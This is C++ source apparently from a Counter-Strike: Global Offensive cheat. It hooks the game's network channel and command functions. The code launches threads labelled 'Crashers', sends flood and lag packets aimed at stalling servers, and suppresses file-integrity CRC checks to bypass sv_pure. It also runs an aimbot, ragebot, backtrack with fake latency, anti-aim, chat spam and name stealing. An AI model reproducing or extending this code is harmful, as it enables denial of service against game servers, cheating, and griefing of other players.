                packet.FreezePackets = config->mmlagger.ticksToSimulate;
                packet.FreezeTimeLeft = 1.0f;
                VoiceDataCustom data;
                memcpy(data.get_raw_data(), &packet, sizeof(packet));
                send_data_msg(&data);
            }


            ExploitOnMsg OnMsg;
            OnMsg.set_on(false);
            OnMsg.set_speed(config->mmlagger.packets);
            OnMsg.set_tickstarted(memory->clientState->serverCount);
            CrossCheatTalk::g_pSteamNetSocketsNetChannel->BroadCastMessage(CrossCheatMsgType::k_ExploitOnMsg, &OnMsg, 58);


            if (config->mmlagger.bNewPrediction) {
                Timing::ExploitTiming.m_bStopAllDatagramsIn = false;
                memory->clientState->deltaTick = nPrevDelta;
            }
            //memory->globalVars->tickCount = memory->clientState->serverCount;
            Timing::TimingSet_s.m_bInPredictionMode = false;

            if ((config->mmlagger.cleanup || !config->mmlagger.bNewPrediction) && !Timing::ExploitTiming.m_bNetworkedFreeze)
                memory->clientState->deltaTick = -1;

            wasOn = false;
        }
        else {
            if (config->mmlagger.bNewPrediction && !Timing::ExploitTiming.m_bNetworkedFreeze)
                Timing::TimingSet_s.m_bInPredictionMode = false;
        }

        if (config->mmlagger.bNewPrediction && !Timing::TimingSet_s.m_bInPredictionMode && !Timing::ExploitTiming.m_bNetworkedFreeze)
            Timing::ExploitTiming.m_bStopAllDatagramsIn = false;
    }
#endif
    auto original = hooks->networkChannel.getOriginal<int, void*>(46, datagram);
    g_OurNetChann = network;
    ClientHooks::g_pNetChannel = network;
    static bool initThings{ false };
    if (!initThings) {
        Debug::QuickWarning("############ Starting Crashers ############");
        _beginthreadex(0, 0, ServerStutterer2, 0, NULL, 0);
        initThings = true;
#ifdef DEV_SECRET_BUILD
        Debug::QuickWarning("############ Starting DEV_SERCRET Crashers ############");
        _beginthreadex(0, 0, PauseServerReceiveThread, 0, NULL, 0);
        _beginthreadex(0, 0, KeepAliveThread, 0, NULL, 0);
        //_beginthreadex(0, 0, Ser, 0, NULL, 0);
        //_beginthreadex(0, 0, EngineHooks::ProcessPacketsCrasher, 0, NULL, 0);
        //_beginthreadex(0, 0, EngineHooks::BlipKick, 0, NULL, 0);
        //_beginthreadex(0, 0, EngineHooks::ReduceServerFrameTime, 0, NULL, 0);
#else 

#endif

    }

    if (!config->backtrack.fakeLatency || datagram || !interfaces->engine->isInGame() || !config->backtrack.enabled || !network)
    {
        int result = original(network, datagram);
        NetworkingMutex.unlock();
        return result;
    }



    int instate = network->InReliableState;
    int insequencenr = network->InSequenceNr;
    int faketimeLimit = config->backtrack.timeLimit; if (faketimeLimit <= 200) { faketimeLimit = 0; }
    else { faketimeLimit -= 200; }
    float delta = max(0.f, std::clamp(faketimeLimit / 1000.f, 0.f, Backtrack::cvars.maxUnlag->getFloat()) - network->getLatency(0));




    Backtrack::AddLatencyToNetwork(network, delta);

    int result = original(network, datagram);



    network->InReliableState = instate;
    network->InSequenceNr = insequencenr;

    NetworkingMutex.unlock();
    return result;
}






int choked = 0;




bool initCal = false;

static unsigned long* data;



NetworkMessage CRC;
bool hasCRC = false;

#include "SDK/SDK/CNetMessageBinder.h"
#include "Timing.h"
int CountOfLag = 0;


struct PrevSignonSettings {
    uint32_t signon_state;
    uint32_t spawn_count;
    uint32_t num_server_players;
} Previous;




#include "cstrike15_usermessages.pb.h"

#include "CrossCheatTalkMessages.pb.h"
#include "Other/CrossCheatTalk.h"

#include "SDK/OsirisSDK/Client.h"
#include "SDK/SDK/ClientModeShared.h"
#include "Memory.h"

typedef void(__thiscall* NetTickCon)(void* ___this, float host_computationtime, float host_computationtime_std_deviation, int m_nDeltaTick, float host_framestarttime_std_deviation);
// This function is under "clienthooks" cause originally I hooked it in create move.... sue me, aight?
typedef bool(__thiscall* SendNetMessageFunc)(void*,void*,bool,bool);
bool __fastcall ClientHooks::SendNetMessage(NetworkChannel* netchann, void* edx, NetworkMessage* msg, bool bForceReliable, bool bVoice) {

    if (config->debug.bNoRender)
        return ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice);

    if (!netchann)
        return false;


    if (msg->getType() == clc_Move) {

        if (g_mSentCmdMutex.try_lock()) {
            g_bHasSentCmd = true;
            g_mSentCmdMutex.unlock();
        }
    }

    if (!config->mmlagger.enabled) {
        if (config->debug.Lagger) {
            if (((msg->getType() == clc_Move) && !config->lagger.OnVoice) || ((msg->getType() == clc_VoiceData) && config->lagger.OnVoice)) {
                bool shouldLag = true;
                if (config->lagger.skipOnCount) {
                    if (CountOfLag >= config->lagger.countToSkip) {
                        shouldLag = false;
                        CountOfLag = 0;
                    }
                    else {
                        CountOfLag++;
                    }
                }

                if (shouldLag) {
                    bForceReliable = true;
                }
                bool ret = ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice);
                if (shouldLag) {
                    if (g_bHasSentLagData == 0) {
                        netchann->Transmit(config->lagger.reliableOnly);
                        ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice); // Call Again get data sent out
                    }
                }
                return true;
            }


            bool ret = ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice);


            return ret;
        }
    }


    if (msg->getType() == int(NET_Messages::net_StringCmd)) {
        auto stringcmd = (NET_StringCmd*)msg;
        if (config->debug.spectateForce) {
            auto stringcmd = (NET_StringCmd*)msg;
            if (strstr(stringcmd->m_szCommand, "joingame")) {
                Debug::QuickPrint("Returning From SendNetMSG, preventing command joingame");
                return true;
            }
        }

        if (config->debug.dontsenddisconnect) {
            if (strstr(msg->toString(), "disconnect")) {
                Debug::QuickPrint("Returning From SendNetMSG, preventing net_Disconnect");
                return true;
            }
        }


        return ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice);
    }





    if ((msg->getType() != net_Tick) && (msg->getType() != clc_Move) && !config->mmcrasher.enabled) {
        if (config->debug.dumpNetInAndOut)
            Debug::QuickPrint(msg->toString());
    }

#ifdef LOCAL_TIMING
//#if 1

    /*
       This is Protection Against Ever Getting a "Client delta ticks out of order " Disconnect
       Hopefully you aren't hosting a local server lol. If you hit this code and it adjusts the
       ticks, that is because you made a mistake! This code should never have to adjust the tick....
       But in the nature of experimenting, stuff does get messed up.
                                                                                          */
#if 1
    if (msg->getType() == net_Tick) {
        if (config->mmlagger.bNewPrediction && Timing::TimingSet_s.m_bInPredictionMode)
            return true;
    }


    static void* pOldNetChannel{ nullptr };
    if (/*!config->mmlagger.constant &&*/ ((((Timing::ExploitTiming.m_fFreezeTimeLeft > 0.f) || Timing::ExploitTiming.m_bNetworkedFreeze) || (Timing::TimingSet_s.m_bInPredictionMode && (netchann == pOldNetChannel) && !config->lagger.FULLONBOGANFUCKERY && !config->debug.Lagger)) && (memory->clientState->signonState >= SIGNONSTATE_FULL))) {
    if (msg->getType() == net_Tick) {
        NET_Tick* tick = reinterpret_cast<NET_Tick*>(msg);

#ifdef BLIPPER_TEST_NET_TICK_CREATE
        if (Timing::ExploitTiming.m_bDontSendNetTick && Timing::ExploitTiming.m_bDoneSendingBlip) {
            if ((Timing::ExploitTiming.m_nMaxNetTickSent > 0)) {
                if ((memory->clientState->deltaTick > (Timing::ExploitTiming.m_nMaxNetTickSent))) {
                    Debug::QuickPrint("Turning Off Timing::ExploitTiming.m_bDontSendNetTick");
                    Debug::QuickPrint(std::to_string(Timing::ExploitTiming.m_nMaxNetTickSent).c_str());
                    Timing::ExploitTiming.m_bDontSendNetTick = false;
                    memory->clientState->deltaTick = -1;
                    tick->tick = -1;
                    nHighestDeltaTick = Timing::ExploitTiming.m_nMaxNetTickSent;
                }
            }
            else {
                return true;
            }
        }
#endif

       





            if (tick->tick == -1) { // We Request Full Update, It's okay that its lower
                nHighestDeltaTick = -1;
            }
            else if (memory->clientState->deltaTick == -1) { // At some point we requested a full update but this tick isn't up to date, lets just do it now
                tick->tick = -1;
            } else if (tick->tick < nHighestDeltaTick) { // Not A Full Update Request, Fix it!
                char buffer[1024];
                snprintf(buffer, 1024, "CNetChan::SendNetMessage: tick->tick was Less Than Previous HIGH! Incrementing To Avoid Disconnect!(%d -> %d)", tick->tick, nHighestDeltaTick + 1);
                Debug::QuickWarning(buffer);
                if ((memory->clientState->signonState >= SIGNONSTATE_FULL) && !GetAsyncKeyState(config->TestShit.fuckKey9))
                    memory->clientState->deltaTick = -1; /* We need to reset out shit anyways...*/
                //tick->tick = nHighestDeltaTick + 1;
                if (tick->tick < memory->clientState->deltaTick) { // Idk whats going on here, lets patch this up... Okay so its a threading issue that gets caused. But it doesn't cause errors if you pretend it doesnt exist
                   
                    char buffer[1024];
                    snprintf(buffer, 1024, "CNetChan::SendNetMessage: After Tick Fix we were still lower than deltaTick!! (%d -> %d)", tick->tick, memory->clientState->deltaTick + 1);
                    Debug::QuickWarning(buffer);
                    //tick->tick = memory->clientState->deltaTick + 1;
                }
                else {
                    //memory->clientState->deltaTick = tick->tick;
                   // memory->clientState->deltaTick = -1; /* Something went wrong we need to re-sync*/
                }
                tick->tick = nHighestDeltaTick + 1;
                nHighestDeltaTick = tick->tick;
                //return true;
            }
            else {
                nHighestDeltaTick = tick->tick;
            }
        }
    }
    else if (!config->lagger.FULLONBOGANFUCKERY && !config->debug.Lagger){
        pOldNetChannel = netchann;
        nHighestDeltaTick = -1;
    }
#endif

#endif

    if ((msg->getType() == clc_Move)) {

#ifdef LOCAL_TIMING
        if (Timing::ExploitTiming.m_bNetworkedFreeze || Timing::TimingSet_s.m_bInPredictionMode) {
#else
        if (false) {
#endif
            CLC_Move* clc = reinterpret_cast<CLC_Move*>(msg);
            clc->num_new_commands = 1;
            NEWTICK = false;
            return ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice);
        }
        else {

            return ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice);
            return true;
        }
    }





    if (msg->getType() == net_PlayerAvatarData) {
        Debug::QuickWarning("BY GOLLY GEE ITS A PLAUER AVATAR DATA!");
    }

    if (msg->getType() == clc_ClientInfo) {
        Debug::QuickPrint("BY GOLLY ITS A CLIENT INFO SEND!");
    }



    if (GetAsyncKeyState(config->TestShit.fuckKey2) && (msg->getType() == clc_VoiceData)) {
        //Net_PlayerAvatarData NPAD;
        for (int i = 0; i < 100; i++) {
            Debug::QuickPrint("Calling Enque!");
            memory->EnqueVeryLargeAsyncTransfer(netchann, msg);
        }
    }

    if ((msg->getType() == clc_FileCRCCheck) && config->misc.svpurebypass) { // Return and don't send messsage if its FileCRCCheck
        return true;
    }


    if ((msg->getGroup() == 9) || (msg->getType() == clc_VoiceData)) {
        bVoice = true;
    }

    if (msg->getGroup() == INetChannelInfo::STRINGTABLE) {
        Debug::QuickPrint("STRING TABLE SENT OUT");
    }


    if (msg->getType() == clc_ClientMessage) {
        Debug::QuickPrint("clc_ClientMessage");
    }

    if (msg->getType() == net_File) {
        Debug::QuickPrint("net_File");
    }


    

    if ((msg->getType() == clc_Move)) {


            if (((netchann->getLatency(FLOW_OUTGOING)*1000) < 300.f) && GetAsyncKeyState(config->TestShit.fuckKey9)) {
                CLC_Move* clcMove = reinterpret_cast<CLC_Move*>(msg);
                clcMove->num_backup_commands = 1;
                clcMove->num_new_commands = 1;
                return ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice);
            }
        
    }


    if ((config->debug.Lagger || GetAsyncKeyState(config->TestShit.fuckKey2)) && GetAsyncKeyState(VK_RSHIFT) && (msg->getType() == clc_Move)) {

        CLC_Move* clcMove = reinterpret_cast<CLC_Move*>(msg);




        if (clcMove->num_new_commands >= 1 && clcMove->data.m_pData && (clcMove->data.m_nDataBytes > 20)) { /* Increases Variance about + 10. Not Really Useful */

            // Backup Old 

            int newCommandSave = clcMove->num_backup_commands;
            int backupCommandSave = clcMove->num_backup_commands;
            int32_t commandNr = *(int32_t*)clcMove->data.m_pData;
            int32_t tickCount = *(int32_t*)(clcMove->data.m_pData + sizeof(int32_t));
            int dataBytesSave = clcMove->data.m_nDataBytes;

            // Setup scrubber

            clcMove->num_backup_commands = 1;
            clcMove->num_new_commands = 1;
            clcMove->data.m_nDataBytes = 16;
            clcMove->data.m_nDataBits = (clcMove->data.m_nDataBytes * 8);
            clcMove->data.WriteUBitLong(INT_MAX, 32);
            clcMove->data.WriteUBitLong(INT_MAX, 32);

            for (int i = 0; i < 10000; i++) {
                ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, true, bVoice);
                if ((i % 2000) == 0) {
                    netchann->Transmit(false);
                }
            }

            clcMove->num_backup_commands = backupCommandSave;
            clcMove->num_new_commands = newCommandSave;
            *(int32_t*)clcMove->data.m_pData = commandNr;
            *(int32_t*)(clcMove->data.m_pData + sizeof(int32_t)) = tickCount;
            clcMove->data.m_nDataBytes = dataBytesSave;
            clcMove->data.m_nDataBits = dataBytesSave * 8;

        }

    }
    else if (GetAsyncKeyState(config->TestShit.fuckKey) && (msg->getType() == net_Tick)) {

        if (!config->backtrack.fakeLatency) {
            return true;
        }
        else {
            NET_Tick* tick = reinterpret_cast<NET_Tick*>(msg);
            if (tick && tick->tick) {
                tick->tick = memory->globalVars->tickCount + 120;
            }

            if (tick && tick->host_computationtime) {
                tick->host_computationtime = 0;
            }

            if (tick && tick->host_computationtime_std_deviation) {
                tick->host_computationtime_std_deviation = 0;
            }

            if (tick && tick->host_framestarttime_std_deviation) {
                tick->host_framestarttime_std_deviation = 0;
            }
        }
    }




   

    if (config->lagger.FULLONBOGANFUCKERY) {
        if (((msg->getType() == clc_Move) && !config->lagger.OnVoice) || ((msg->getType() == clc_VoiceData) && config->lagger.OnVoice)) {
            bool shouldLag = true;
            if (config->lagger.skipOnCount) {
                if (CountOfLag >= config->lagger.countToSkip) {
                    shouldLag = false;
                    CountOfLag = 0;
                }
                else {
                    CountOfLag++;
                }
            }

            if (shouldLag) {
                bForceReliable = true;
            }
            bool ret = ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice);
            if (shouldLag) {
                netchann->Transmit(config->lagger.reliableOnly);
            }
            return true;
        }
    }




    if (msg->getType() == int(net_Disconnect)) {

        if (config->debug.dontsenddisconnect) {
            Debug::QuickPrint("Returning From SendNetMSG, preventing net_Disconnect");
        }
        return true;
    }


   



    if (msg->getType() == net_SignonState) {
        NET_SignonState* signon = reinterpret_cast<NET_SignonState*>(msg);

        char buffer[4096];

        const char* formatter = {
            "NET_SignonState in SendNetMessage \n"
            "signon_state       = %d\n"
            "spawn_count        = %d\n"
            "num_server_players = %d\n"
        };

        snprintf(buffer, 4095, formatter, signon->signon_state, signon->spawn_count, signon->num_server_players);
        Debug::QuickPrint(buffer);
    }


    return ((SendNetMessageFunc)oCNET_SendNetMessage)(netchann, msg, bForceReliable, bVoice);  
}


bool __fastcall SendData(NetworkChannel* netchannel, void* edx, bf_write* msg, bool bReliable){
    
    Debug::QuickPrint("ClientHooks::SendData Entered");   
    auto original = hooks->networkChannel.getOriginal<bool, bf_write*, bool>(41, msg, bReliable);

    Debug::QuickPrint("ClientHooks::SendData Calling Original");
    return original(netchannel, msg, bReliable);
}



void __fastcall Transmit(NetworkChannel* netchann, void* edx, bool bReliable) {

    auto original = hooks->networkChannel.getOriginal<bool>(47, bReliable);

    if(config->lagger.ResetOnTransmit)
        g_bHasSentLagData = 0;

    if (config->misc.autoAccept)
        original(netchann, true);
    else
        original(netchann, bReliable);

}


bool __fastcall CanPacket(void* netchan, void* edx)
{
    return true;
}














#include "Hacks/DlightPlayer.h"
#include "Hacks/Aimbot.h"
#include "Hacks/Misc.h"
#include "Hacks/AntiAim.h"
#include "Other/EnginePrediction.h"
#include "Other/Animations.h"
#include "Hacks/Grief.h"
#include "Hacks/RageBot/Ragebot.h"
#include "Hacks/AimAssist.h"
#include "Hacks/RageBot/Resolver.h"
#include "Hacks/TickbaseManager.h"
#include "Hacks/Walkbot/Walkbot.h"
#include "SDK/SDKAddition/SoundSystem.h"
#include "Hacks/Walkbot/WalkbotController.h"
#include "Hacks/ESP.h"


#include "Timing.h"
#include "Other/SteamNetSocketsMessageHandler.h"
#include "Other/CrossCheatTalk.h"
bool __stdcall ClientModeHooks::createMove(float inputSampleTime, UserCmd* cmd) noexcept
{



    auto result = hooks->clientMode.callOriginal<bool, 24>(inputSampleTime, cmd);

    if (GetAsyncKeyState(config->TestShit.fuckKey7)) {
        return result;
    }

    static void* oldPointer = nullptr;

    auto network = interfaces->engine->getNetworkChannel();
    if (((oldPointer != network)) && network )
    {
        lastTickCalled = 0;
        oldPointer = network;
        if (cmd->commandNumber && localPlayer && localPlayer.get()) {
            Backtrack::UpdateIncomingSequences(true);
        }
        hooks->networkChannel.init(network);
        //hooks->networkChannel.hookAt(40, SendNetMsg);
        //hooks->networkChannel.hookAt(41, SendData);
        hooks->networkChannel.hookAt(46, SendDatagram);
        hooks->networkChannel.hookAt(47, Transmit);
        //hooks->networkChannel.hookAt(56, CanPacket);
        hooks->netchanhooked = true;
    }
    if (cmd && interfaces->engine && (cmd->commandNumber || !interfaces->engine->getNetworkChannel())) {

        Backtrack::UpdateIncomingSequences();
    }

    if (!cmd)
        return result;

    static int lastCommand{ 0 };
    static int lastTick{ 0 };

    uintptr_t* framePointer;
    __asm mov framePointer, ebp;
    bool& sendPacket = *reinterpret_cast<bool*>(*framePointer - 0x1C);

    static auto previousViewAngles{ cmd->viewangles };
    const auto currentViewAngles{ cmd->viewangles };

    if (!cmd->commandNumber || !cmd->tickCount) {
        Tickbase::OnCreateMove(cmd, sendPacket);
        return result;   
    }

    if (!interfaces->engine->isInGame() || !interfaces->engine->isConnected() || !localPlayer.get())
        return result;

#if 0
    if (Timing::ExploitTiming.m_nTicksLeftToDrop > 0)
    {
        Timing::ExploitTiming.m_LastCmd.hasbeenpredicted = cmd->hasbeenpredicted;
        Timing::ExploitTiming.m_LastCmd.tickCount = cmd->tickCount;
        Timing::ExploitTiming.m_LastCmd.commandNumber = cmd->commandNumber;
        memory->clientState->lastCommandAck++;
        *cmd = Timing::ExploitTiming.m_LastCmd;
        memory->globalVars->serverTime(cmd);

        if (localPlayer.get())
            EnginePrediction::run(cmd);

        Timing::ExploitTiming.m_nTicksLeftToDrop--;
        sendPacket = true;
        return result;
    }
#endif

    memory->globalVars->serverTime(cmd);

    

    bool ValidLP = (localPlayer && localPlayer.get() && !localPlayer->isDormant() && localPlayer->isAlive()) && !Timing::TimingSet_s.m_bInPredictionMode;


    Misc::revealRanks(cmd);
    Misc::updateClanTag(false, cmd);
    if (!config->walkbot.bunnyhop) {
        Misc::bunnyHop(cmd);
        Misc::autoStrafe(cmd);
    }
    if (ValidLP) {
        Misc::DoorSpam(cmd);
        Misc::slowwalk(cmd);
        Misc::PerfectShot(sendPacket, cmd);
    }

    Tickbase::OnCreateMove(cmd, sendPacket);

    if (localPlayer.get())
        Player_Dlight::SetupLights();

    if(localPlayer.get())
        EnginePrediction::run(cmd);


    if (ValidLP && !config->debug.bNoRender) {
        Misc::antiAfkKick(cmd);
        //Misc::prepareRevolver(cmd);
        Visuals::FogControl();
        if (config->rageEnabled) {
            if (config->debug.newRage) {
                RageBot::New(cmd);
            }
            else {
                RageBot::Run(cmd);
            }
        }
        else {
            Aimbot::Run(cmd, sendPacket);
            Aimbot::Run(cmd, sendPacket);
        }

        AimAssist::Run(cmd);


        if (!(cmd->buttons & UserCmd::IN_ATTACK) || config->debug.AAALWAYS) {
            if (config->antiAim.enabled) {
                AntiAim::legitAA(cmd, currentViewAngles, sendPacket);
                AntiAim::run(cmd, previousViewAngles, currentViewAngles, sendPacket);
            }
        }


        if ((localPlayer->armor() < 100) && config->debug.Vest) {
            interfaces->engine->clientCmdUnrestricted("buy vesthelm; buy vest");
        }


        Backtrack::run(cmd);

        Grief::ChatSpam(cmd);
        Grief::TriggerBotNameSteal(cmd);


        Grief::GrenadeAim(cmd);
        Grief::BlockBot(cmd);
#ifdef MASTER_CONTROLLER
        WalkbotController::Run(cmd);
#endif

    }
    Walkbot::Run(cmd);


    Debug::ViewAngles = cmd->viewangles;
    auto viewAnglesDelta{ cmd->viewangles - previousViewAngles };
    viewAnglesDelta.normalize();
    viewAnglesDelta.x = std::clamp(viewAnglesDelta.x, -config->misc.maxAngleDelta, config->misc.maxAngleDelta);
    viewAnglesDelta.y = std::clamp(viewAnglesDelta.y, -config->misc.maxAngleDelta, config->misc.maxAngleDelta);

    cmd->viewangles = previousViewAngles + viewAnglesDelta;

    cmd->viewangles.normalize();

    cmd->viewangles.x = std::clamp(cmd->viewangles.x, -89.0f, 89.0f);
    cmd->viewangles.y = std::clamp(cmd->viewangles.y, -180.0f, 180.0f);
    cmd->viewangles.z = 0.0f;
    cmd->forwardmove = std::clamp(cmd->forwardmove, -450.0f, 450.0f);
    cmd->sidemove = std::clamp(cmd->sidemove, -450.0f, 450.0f);



    ESP::TransmitFreezeTimeData();




    if (GetAsyncKeyState(config->TestShit.fuckKey)) {
        cmd->hasbeenpredicted = true;
    }
    if (!config->antiAim.enabled) {
        if (!Tickbase::TickBaseInfo.bInShift && !Tickbase::TickBaseInfo.bDidShift)
            sendPacket = true;
    }

    if (Timing::TimingSet_s.m_bInPredictionMode || Timing::ExploitTiming.m_bNetworkedFreeze)
    {



        // Always Send Packet on lag spike cause you'll hit sv_maxusercmdprocessticks else
        //if (Timing::TimingSet_s.m_bInPredictionMode) // && Timing::TimingSet_s.m_bActivatedDueToPing

           sendPacket = true;




        if (GetAsyncKeyState(config->TestShit.fuckKey9) || Timing::ExploitTiming.m_bNetworkedFreeze) {
            sendPacket = true;
        }

    }

    Timing::ExploitTiming.m_LastCmd = *cmd;
        
    if (config->debug.LPAnimFix && ValidLP) {
        if (ValidLP) {
            Animations::update(cmd, sendPacket);
        }
        Animations::fake(cmd);
    }


    return false;
}



#include "Hacks/Chams.h"
#include "SDK/OsirisSDK/Prediction.h"
#include "Hacks/ESP.h"
#include "PlayerList.h"
void __stdcall ClientHooks::frameStageNotify(FrameStage stage) noexcept
{
    static auto backtrackInit = (Backtrack::init(), false);
    switch (stage) {
    case FrameStage::START:
        //iden::HasBeenCalled = false;
        entitylistculled->cullEntities();
        GameData::update();
        break;
    case FrameStage::NET_UPDATE_START:
        break;
    case FrameStage::NET_UPDATE_POSTDATAUPDATE_START:
        break;
    case FrameStage::NET_UPDATE_POSTDATAUPDATE_END:   
    {
        entitylistculled->cullEntities();
        if (!config->debug.bNoRender)
        {
            Animations::players();
            ESP::BuildSharedESPPackets();
        }
    }
        break;
    case FrameStage::NET_UPDATE_END:
        break;
    case FrameStage::RENDER_START:
        if (!config->debug.bNoRender)
        {
            PlayerList::UpdatePlayerList();
#if 1
            Resolver::Update();
            if (config->debug.animstatedebug.resolver.enabled) {
                for (EntityQuick entQuick : entitylistculled->getEnemies()) {
                    Resolver::NewAnimStateResolver(entQuick.entity);
                    //Resolver::AnimStateResolver(entQuick.entity);
                }
            }
#endif
            Visuals::colorWorld();
            Visuals::MoltovColor();
            Visuals::NightModeExtended();
            Visuals::NightModeExtended();
            Misc::fakePrime();
        }
        Animations::real();
        break;
    case FrameStage::RENDER_END:
        if(!config->debug.bNoRender)
            Resolver::Reset(stage);
        break;
    case FrameStage::UNDEFINED:
        break; // Shouldn't be here
    default:
        break;
    }

    if (interfaces->engine->isInGame()) {
        Backtrack::update(stage);
        if (!config->debug.bNoRender)
        {
            Visuals::skybox(stage);
            Visuals::remove3dSky();
            Visuals::removeBlur(stage);
            Visuals::removeGrass(stage);
            Visuals::modifySmoke(stage);
            Visuals::playerModel(stage);
            Visuals::disablePostProcessing(stage);
            Visuals::removeVisualRecoil(stage);
            Visuals::applyZoom(stage);
            Visuals::NoScopeInZoom(stage);
            Glow::render();

            if (localPlayer && localPlayer.get() && !localPlayer->isDormant() && localPlayer->isAlive())
                localPlayer->flashMaxAlpha() = 0.f;
        }

    }

    hooks->client.callOriginal<void, 37>(stage);
}

#include "Hacks/TickbaseManager.h"
#include "Memory.h"
#include "SDK/OsirisSDK/Input.h"
#include <math.h>
#include <intrin.h>
#include <functional>
#include <algorithm>
#include <iostream>
#include <string_view>
void WriteUsercmd(void* buf, UserCmd* in, UserCmd* out)
{
    static DWORD WriteUsercmdF = (DWORD)memory->WriteUsercmd;

    __asm
    {
        mov ecx, buf
        mov edx, in
        push out
        call WriteUsercmdF
        add esp, 4
    }
}

bool __fastcall ClientHooks::WriteUsercmdDeltaToBuffer(void* ecx, void* edx, int slot, void* buffer, int from, int to, bool isnewcommand) noexcept
{
    auto original = hooks->client.getOriginal<bool, 24, int, void*, int, int, bool>(slot, buffer, from, to, isnewcommand);


    if (!config->stutterstep.enabled || _ReturnAddress() == memory->WriteUsercmdDeltaToBufferReturn || !memory->clientState || true)
        return original(ecx, slot, buffer, from, to, isnewcommand);
#if 0
    if (from != -1)
        return true;


    if (GetAsyncKeyState(config->TestShit.fuckKey2)) {
        UserCmd nullcmd, * pFrom, * pTo;

        if (from == -1)
        {
            pFrom = &nullcmd;
        }
        else
        {
            pFrom = memory->input->GetUserCmd(slot, from);

            if (!pFrom)
                pFrom = &nullcmd;
        }

        pTo = memory->input->GetUserCmd(slot, to);

        if (!pTo)
            pTo = &nullcmd;

        WriteUsercmd(buffer, pTo, pFrom);

        if (*(bool*)((DWORD)buffer + 0x10))
            return false;


        return false;
    }



    int* numBackupCommands = (int*)(reinterpret_cast <uintptr_t> (buffer) - 0x30);
    int* numNewCommands = (int*)(reinterpret_cast <uintptr_t> (buffer) - 0x2C);

    int32_t newcommands = *numNewCommands;

    int nextcommmand = memory->clientState->lastOutgoingCommand + memory->clientState->chokedCommands + 1;
    int totalcommands = min(TickbaseManager::tick->tickshift, TickbaseManager::tick->maxUsercmdProcessticks);
    int shiftedTicks = TickbaseManager::tick->tickshift;
    TickbaseManager::tick->tickshift = 0;

    from = -1;
    *numNewCommands = totalcommands;
    *numBackupCommands = 0;

    for (to = nextcommmand - newcommands + 1; to <= nextcommmand; to++)
    {
        if (!(original(ecx, slot, buffer, from, to, true))) {
            return false;
        }
        from = to;
    }

    UserCmd* lastRealCmd = memory->input->GetUserCmd(slot, from);
    UserCmd fromcmd;

    if (lastRealCmd) {
        fromcmd = *lastRealCmd;
    }
    UserCmd tocmd = fromcmd;
    //tocmd.tickCount += 200;
    if(config->stutterstep.enabled) tocmd.tickCount++; else tocmd.commandNumber++;

    for (int i = newcommands; i <= totalcommands; i++)
    {
        WriteUsercmd(buffer, &tocmd, &fromcmd);

        if (config->stutterstep.enabled) memory->clientState->netChannel->OutSequenceNr += tocmd.tickCount % 4 == 0 ? 200 : -50;


        fromcmd = tocmd;
        tocmd.commandNumber++;
        tocmd.tickCount++;
    }

    return true;
#endif
}


#include "SDK/OsirisSDK/MaterialSystem.h"
#include "SDK/OsirisSDK/KeyValues.h"
Material* flat;
static void createMat() {
    flat = interfaces->materialSystem->createMaterial("normalmcsi", KeyValues::fromString("VertexLitGeneric", nullptr));
}


typedef void(__thiscall* RenderModelsFunc)(void*, StudioModelArrayInfo2_t*, int, ModelRenderSystem::ModelListByType_t*, int, ModelRenderSystem::ModelRenderMode_t, int);


bool def = false;


typedef void(__thiscall* ModelRenderDrawModelsFn)(void* _this, ModelRenderSystem::ModelRenderSystemData_t* pEntities, int nCount, ModelRenderSystem::ModelRenderMode_t renderMode, char unknown);
void __fastcall ClientHooks::ModelRenderDrawModels(void* _this, void* ecx, ModelRenderSystem::ModelRenderSystemData_t* pEntities, int nCount, ModelRenderSystem::ModelRenderMode_t renderMode, char unknown) {

    ((ModelRenderDrawModelsFn)oModelRenderDrawModels)(_this, pEntities, nCount, renderMode, unknown);
}




void __fastcall ClientHooks::RenderModels(void* _this, void* edx, StudioModelArrayInfo2_t* pInfo, int nModelTypeCount, ModelRenderSystem::ModelListByType_t* pModelList, int nTotalModelCount, ModelRenderSystem::ModelRenderMode_t renderMode, int nFlags) noexcept {
   
    if (config->walkbot.NoRender)
        return;

    static Chams DyanmicPropsChams;
    if (renderMode == ModelRenderSystem::MODEL_RENDER_MODE_NORMAL)
    {
        //DyanmicPropsChams.RenderModelsChams(_this, edx, pInfo, nModelTypeCount, pModelList, nTotalModelCount, renderMode, nFlags);
        //return;
    }
    

    
    if (!oRenderModels)
        return;

    ((RenderModelsFunc)oRenderModels)(_this, pInfo, nModelTypeCount, pModelList, nTotalModelCount, renderMode, nFlags);
    return;

#if 0
    /*

    "Rebuilt" (aka copied from sdk with a few updates and fixes below. Useful for debugging and experimenting. CMatRenderData< StudioArrayData_t > rdArray(m_pRenderContext, nModelTypeCount); needs to be init'd. Best just call original

    */


    static ConVar* cl_colorfastpath = interfaces->cvar->findVar("cl_colorfastpath");
    IMatRenderContext* m_pRenderContext = (IMatRenderContext*)((uintptr_t)(_this)+19);
    if (renderMode == ModelRenderSystem::MODEL_RENDER_MODE_NORMAL)
    {
        bool bColorize = cl_colorfastpath->getInt();
        if (bColorize)
        {
            //interfaces->studioRender->forcedMaterialOverride(m_DebugMaterial);
        }

        const int nFlags = STUDIORENDER_DRAW_OPAQUE_ONLY;

        //CMatRenderData< StudioArrayData_t > rdArray(m_pRenderContext, nModelTypeCount);

        int nNonStencilModelTypeCount = 0;
        for (int i = 0; i < nModelTypeCount; ++i)
        {
            ModelRenderSystem::ModelListByType_t& list = pModelList[i];
            rdArray[i].m_pStudioHdr = list.m_pStudioHdr;
            rdArray[i].m_pHardwareData = list.m_pHardwareData;
            rdArray[i].m_pInstanceData = list.m_pRenderModels;
            rdArray[i].m_nCount = list.m_nCount;
            nNonStencilModelTypeCount += list.m_bWantsStencil ? 0 : 1;
        }


        // PC renders all models in one go regardless of stencil state
